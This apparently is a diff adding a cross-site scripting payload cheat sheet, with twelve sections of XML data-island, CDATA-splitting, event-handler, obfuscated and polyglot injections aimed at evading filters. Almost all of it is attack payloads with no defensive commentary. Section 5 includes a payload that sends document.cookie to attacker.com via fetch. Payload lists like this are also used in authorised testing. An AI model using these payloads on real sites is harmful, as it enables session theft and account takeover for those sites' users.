@@ -1,0 +1,94 @@
+🔥 ULTIMATE XML / SPAN XSS (CLEAN)
+
+⸻
+
+1. CORE (LEGACY ⚠️ IE ONLY)
+
+<xml id=x><a><b><img src=x onerror=alert(1)></b></a></xml>
+<span datasrc=#x datafld=b dataformatas=html></span>
+
+
+⸻
+
+2. CDATA BREAKOUT
+
+<xml id=x><a><b><![CDATA[<img src=x onerror=alert(1)>]]></b></a></xml>
+<span datasrc=#x datafld=b dataformatas=html></span>
+
+
+⸻
+
+3. SPLIT BYPASS (FILTER EVADE)
+
+<xml id=x><a><b><![CDATA[<img src="jav]]><![CDATA[ascript:alert(1)">]]></b></a></xml>
+<span datasrc=#x datafld=b dataformatas=html></span>
+
+
+⸻
+
+4. EXTERNAL XML LOAD (⚠️)
+
+<xml src="xss.xml" id=x></xml>
+<span datasrc=#x datafld=c dataformatas=html></span>
+
+
+⸻
+
+5. DATA EXTRACTION
+
+<xml id=x><a><b><![CDATA[<img src=x onerror=fetch('//attacker.com?c='+document.cookie)>]]></b></a></xml>
+<span datasrc=#x datafld=b dataformatas=html></span>
+
+
+⸻
+
+6. MODERN SUBSTITUTE (MUHIM)
+
+<span onmouseover=alert(1)>hover</span>
+<span onclick=alert(1)>click</span>
+
+
+⸻
+
+7. SPAN + DOM INJECTION
+
+<span id=x></span>
+<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>
+
+
+⸻
+
+8. CONTEXT BREAKOUT
+
+"><span onmouseover=alert(1)>
+
+
+⸻
+
+9. POLYGLOT
+
+</title><span onmouseover=alert(1)>
+
+
+⸻
+
+10. OBFUSCATION
+
+<span onmouseover=\u0061lert(1)>
+<span onclick=alert(String.fromCharCode(88,83,83))>
+
+
+⸻
+
+11. ADVANCED JS
+
+<span onclick=eval('alert(1)')>
+<span onclick=setTimeout(alert,0,1)>
+
+
+⸻
+
+12. HYBRID (CHAIN)
+
+<span><img src=x onerror=alert(1)></span>
+<span><svg onload=alert(1)></span>
